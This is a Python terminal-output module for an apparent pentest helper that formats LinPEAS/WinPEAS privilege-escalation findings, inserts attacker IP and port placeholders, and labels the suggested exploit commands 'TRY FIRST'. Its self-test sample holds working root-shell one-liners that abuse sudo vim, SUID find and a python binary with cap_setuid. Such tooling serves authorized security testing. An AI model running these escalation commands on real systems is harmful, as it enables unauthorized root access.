"""Print ReadPEAS findings to the terminal with ANSI colors."""

from typing import Dict, List, Optional

# ── ANSI color constants ───────────────────────────────────────────────────────
RESET  = "\x1b[0m"
BOLD   = "\x1b[1m"
DIM    = "\x1b[2m"
RED    = "\x1b[31m"
YELLOW = "\x1b[33m"
CYAN   = "\x1b[36m"
GREEN  = "\x1b[32m"

_VERSION = "0.1.0"
_DIVIDER = DIM + "-" * 60 + RESET


# ── Helpers ───────────────────────────────────────────────────────────────────

def _inject_ip_port(cmd: str, ip: Optional[str], port: int) -> str:
    """Replace LHOST and LPORT placeholders in a command string."""
    if not ip:
        return cmd
    return cmd.replace("LHOST", ip).replace("LPORT", str(port))


def severity_color(severity: str) -> str:
    """Return the ANSI color+style prefix for a given severity string."""
    return {
        "CRITICAL": RED + BOLD,
        "HIGH":     YELLOW + BOLD,
        "INFO":     CYAN,
    }.get(severity, RESET)


# ── Public API ────────────────────────────────────────────────────────────────

def print_banner() -> None:
    """Print the ReadPEAS ASCII banner."""
    print(GREEN + BOLD + r"  ____                _ ____  _____    _    ____  " + RESET)
    print(GREEN + BOLD + r" |  _ \ ___  __ _  __| |  _ \| ____|  / \  / ___| " + RESET)
    print(GREEN + BOLD + r" | |_) / _ \/ _` |/ _` | |_) |  _|   / _ \ \___ \ " + RESET)
    print(GREEN + BOLD + r" |  _ <  __/ (_| | (_| |  __/| |___ / ___ \ ___) |" + RESET)
    print(GREEN + BOLD + r" |_| \_\___|\__,_|\__,_|_|   |_____/_/   \_\____/ " + RESET)
    print(DIM + f"  LinPEAS/WinPEAS output reader  v{_VERSION}" + RESET)
    print()


def print_summary(result: Dict) -> None:
    """Print OS and total findings count."""
    os_name = result.get("os", "unknown")
    total   = result.get("total", 0)
    error   = result.get("error")
    print(CYAN + f"[*] OS: {os_name}" + RESET)
    print(CYAN + f"[*] Total findings: {total}" + RESET)
    if error:
        print(YELLOW + f"[!] {error}" + RESET)
    print()


def print_finding(finding: Dict, ip: Optional[str] = None, port: int = 4444) -> None:
    """Print a single finding with severity, type, target, and commands."""
    severity = finding.get("severity", "INFO")
    ftype    = finding.get("type", "")
    commands = finding.get("commands", [])
    color    = severity_color(severity)

    # Build header based on finding type
    if ftype in ("cron", "writable_cron"):
        script   = finding.get("script", "")
        schedule = finding.get("schedule", "")
        run_as   = finding.get("run_as", "")
        header = f"[{severity}] {ftype} -> {script} (every: {schedule}, run_as: {run_as})"
    elif ftype == "writable_file":
        filepath = finding.get("file", "")
        header = f"[{severity}] {ftype} -> {filepath}"
    elif ftype == "pythonpath":
        script   = finding.get("script", "")
        header = f"[{severity}] {ftype} -> {finding.get('full_path', '')} ({script})  [SETENV]"
        if not finding.get("nopasswd", True):
            header += "  (password required)"
    elif ftype == "ld_preload":
        env_var  = finding.get("env_var", "")
        sudo_cmd = finding.get("sudo_command", "")
        header = f"[{severity}] {ftype} -> {env_var} (via: {sudo_cmd})"
        if not finding.get("nopasswd", True):
            header += "  (password required)"
    elif ftype == "nfs":
        export_path = finding.get("export_path", "")
        header = f"[{severity}] {ftype} -> {export_path} (no_root_squash)"
    elif ftype == "path_hijack":
        wdir = finding.get("writable_dir", "")
        note = finding.get("note", "")
        header = f"[{severity}] {ftype} -> {wdir}  [{note}]"
    elif ftype == "group":
        group = finding.get("group", "")
        desc  = finding.get("description", "")
        header = f"[{severity}] {ftype} -> {group}  {desc}"
    elif ftype == "systemd_service":
        service_path = finding.get("service_path", "")
        header = f"[{severity}] {ftype} -> {service_path}"
    elif ftype == "logrotate":
        log_path = finding.get("log_path", "")
        header = f"[{severity}] {ftype} -> {log_path}  (logrotten)"
    elif ftype == "mysql_udf":
        header = f"[{severity}] {ftype} -> mysqld running as root  (UDF injection)"
    elif ftype == "docker_sock":
        header = f"[{severity}] {ftype} -> /var/run/docker.sock  (writable)"
    elif ftype == "credential":
        password = finding.get("password", "")
        context  = finding.get("context", "")
        header = f"[{severity}] {ftype} -> {password!r}  ({context})"
    elif ftype == "wildcard_injection":
        script      = finding.get("script", "")
        working_dir = finding.get("working_dir", "")
        header = f"[{severity}] {ftype} -> {script} (tar wildcard in cron)"
        if working_dir:
            header += f"  [workdir: {working_dir}]"
    elif ftype == "motd_writable":
        header = f"[{severity}] {ftype} -> {finding.get('motd_path', '')}  ({finding.get('description', 'runs as root on SSH login')})"
    elif ftype == "lxd_group":
        header = f"[{severity}] {ftype} -> {finding.get('description', '')}"
    elif ftype == "docker_group":
        header = f"[{severity}] {ftype} -> {finding.get('description', '')}"
    elif ftype == "tmux_socket":
        header = f"[{severity}] {ftype} -> {finding.get('socket_path', '')}  ({finding.get('description', 'root tmux session')})"
    elif ftype == "service_binary":
        header = f"[{severity}] {ftype} -> {finding.get('binary_path', '')}  ({finding.get('description', 'writable service binary')})"
    elif ftype == "ssh_keys":
        key_path = finding.get("key_path", "")
        enc = finding.get("encrypted")
        enc_str = "unencrypted" if enc is False else ("encrypted" if enc else "unknown encryption")
        header = f"[{severity}] {ftype} -> {key_path}  ({enc_str})"
    elif ftype == "screen_exploit":
        header = f"[{severity}] {ftype} -> {finding.get('binary_path', '')}  ({finding.get('description', 'EDB-41154')})"
    elif ftype == "writable_cron_d":
        header = f"[{severity}] {ftype} -> {finding.get('cron_path', '')}  ({finding.get('description', 'world-writable cron.d file')})"
    elif ftype == "writable_exec_script":
        header = f"[{severity}] {ftype} -> {finding.get('script_path', '')}  ({finding.get('description', 'group-writable exec script')})"
    else:
        # sudo / suid / capabilities
        binary    = finding.get("binary", "")
        full_path = finding.get("full_path", "")
        caps      = finding.get("caps")
        header = f"[{severity}] {ftype} -> {binary} ({full_path})"
        if caps:
            header += f"  [{caps}]"
        if ftype == "sudo" and not finding.get("nopasswd", True):
            header += "  (password required)"

    print(color + header + RESET)

    # Show investigation note for unknown SUID binaries
    if ftype == "suid" and finding.get("note"):
        print(DIM + f"  Note: {finding['note']}" + RESET)

    # Show investigation note for dac capability findings
    if ftype == "capabilities" and finding.get("note"):
        print(DIM + f"  Note: {finding['note']}" + RESET)

    if commands:
        # Apply LHOST/LPORT substitution at render time
        rendered = [_inject_ip_port(c, ip, port) for c in commands]
        print(DIM + "TRY FIRST:" + RESET)
        print("  " + BOLD + "$ " + RESET + rendered[0])
        if len(rendered) > 1:
            print(DIM + f"Other options ({len(rendered) - 1} more):" + RESET)
            for cmd in rendered[1:]:
                print("  " + BOLD + "$ " + RESET + cmd)
    else:
        print(DIM + "No exploit commands found." + RESET)


def print_results(
    result: Dict,
    only_severity: Optional[str] = None,
    ip: Optional[str] = None,
    port: int = 4444,
) -> None:
    """Print banner, summary, and all findings; filter by severity if specified."""
    print_banner()
    print_summary(result)

    findings = result.get("findings", [])
    if only_severity:
        findings = [f for f in findings if f.get("severity") == only_severity.upper()]

    for i, finding in enumerate(findings):
        if i > 0:
            print(_DIVIDER)
        print_finding(finding, ip=ip, port=port)

    if not findings:
        print(DIM + "No findings to display." + RESET)
    print()


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLE_RESULT = {
        "os": "linux",
        "total": 7,
        "findings": [
            {
                "binary": "vim",
                "full_path": "/usr/bin/vim",
                "severity": "CRITICAL",
                "type": "sudo",
                "commands": [
                    "sudo vim -c ':!/bin/bash'",
                    "sudo vim -c ':py import os; os.system(\"/bin/bash\")'",
                ],
            },
            {
                "binary": "find",
                "full_path": "/usr/bin/find",
                "severity": "CRITICAL",
                "type": "suid",
                "matched_as": "find",
                "commands": [
                    "/usr/bin/find . -exec /bin/bash -p \\; -quit",
                ],
            },
            {
                "binary": "python3.9",
                "full_path": "/usr/bin/python3.9",
                "caps": "cap_setuid+ep",
                "severity": "CRITICAL",
                "type": "capabilities",
                "matched_as": "python",
                "commands": [
                    "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                ],
            },
            {
                "binary": "ping",
                "full_path": "/usr/bin/ping",
                "caps": "cap_net_raw+ep",
                "severity": "HIGH",
                "type": "capabilities",
                "commands": [],
            },
            {
                "binary": "notabin",
                "full_path": "/usr/bin/notabin",
                "severity": "INFO",
                "type": "sudo",
                "commands": [],
            },
            {
                "binary": "notabin2",
                "full_path": "/usr/bin/notabin2",
                "severity": "INFO",
                "type": "suid",
                "commands": [],
            },
            {
                "binary": "openssl",
                "full_path": "/usr/bin/openssl",
                "caps": "cap_net_bind_service+ep",
                "severity": "INFO",
                "type": "capabilities",
                "commands": [],
            },
        ],
    }

    print("=== Full output ===")
    print_results(SAMPLE_RESULT)

    print("=== CRITICAL only ===")
    print_results(SAMPLE_RESULT, only_severity="CRITICAL")
